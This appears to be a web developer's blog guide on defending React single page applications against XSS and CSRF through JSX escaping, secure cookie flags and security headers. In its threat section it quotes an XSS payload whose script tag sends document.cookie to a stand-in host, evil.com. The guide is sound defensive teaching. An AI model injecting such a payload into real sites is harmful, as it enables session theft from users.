title: Defending Modern Single Page Applications Against Cross-Site Scripting (XSS) and CSRF Attacks
seoTitle: Securing Modern SPAs: XSS and CSRF Defense Guide
description: Learn practical methods to prevent XSS and defend against CSRF in modern React single page applications using secure headers and HTTP-only cookies.

author.name: Aafaque Nazir
author.bio: Independent web engineer building high-performance websites, e-commerce stores, and SaaS web applications for clients across India & worldwide.

quickAnswer: To prevent XSS in React, avoid using dangerouslySetInnerHTML and sanitize user input. To defend against CSRF, store session tokens in SameSite HTTP-only cookies instead of localStorage.

faqs.question: How do you prevent XSS in React applications?
faqs.answer: React automatically escapes values embedded in JSX, which protects against most XSS out of the box. However, you must avoid dangerouslySetInnerHTML and validate all data rendered from untrusted sources.

faqs.question: Are HttpOnly cookies secure against CSRF?
faqs.answer: HttpOnly cookies prevent JavaScript from reading your tokens, which stops XSS theft. However, they are still sent automatically by the browser on cross-origin requests, so you must combine them with the SameSite attribute set to Strict or Lax.

faqs.question: Should I store JWT authentication tokens in localStorage?
faqs.answer: No. Storing authentication tokens in localStorage makes them instantly readable by any malicious script injected via an XSS vulnerability. Store session tokens in secure HTTP-only cookies instead.

sections.title: Understanding the Threat Landscape in Single Page Applications

sections.text: Modern single page applications shift a massive amount of rendering logic to the client browser. While this creates fast user experiences, it also changes how security vulnerabilities manifest. When building complex business software like [Inventory Management / InvMaster OS](/projects/1/), protecting user data and session integrity is non-negotiable. Two common attack vectors threaten client-heavy applications: Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF).

XSS occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute arbitrary JavaScript in the victim's browser. CSRF tricks a authenticated user into executing unwanted actions on a web application in which they are currently authenticated.

React protects developers by escaping all content rendered inside JSX expressions by default. If a user inputs malicious markup like `<script>fetch('https://evil.com/'+document.cookie)</script>`, React converts those characters into safe strings rather than executing them.
The vulnerability usually appears when developers bypass these built-in protections to render rich text or raw HTML strings using unsafe utilities.

sections.caption: Unsafe vs Safe HTML Rendering in React

sections.title: Rule of Thumb for Input Handling
sections.text: Never trust data originating from client input fields, URL parameters, or third-party APIs. Always sanitize on both the client side before rendering and on the server side before storing in the database.

sections.title: Preventing CSRF via Secure Cookie Architecture

sections.text: Many applications store JSON Web Tokens (JWT) inside browser `localStorage`. While convenient, this practice leaves tokens vulnerable to XSS theft. If an attacker injects a script, they can read `localStorage.getItem('token')` and ship your session credentials to an external server.
The secure alternative is storing session tokens in cookies configured with strict security flags:

items: HttpOnly: Blocks client-side JavaScript from reading the cookie, neutralizing XSS token theft.
Secure: Ensures the cookie is only transmitted over encrypted HTTPS connections.
SameSite=Strict (or Lax): Prevents the browser from sending the cookie along with cross-site requests, mitigating CSRF attacks.

sections.title: Locking Down Security Headers and Content Security Policy (CSP)

sections.text: Beyond code-level safeguards, your web server must deliver strong HTTP security headers. A robust Content Security Policy (CSP) restricts the domains from which scripts, stylesheets, and images can be loaded.

sections.caption: Recommended Production Security Headers
sections.code:
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

sections.text: Implementing these headers stops clickjacking attempts, prevents MIME-type confusion attacks, and enforces HTTPS connections globally.
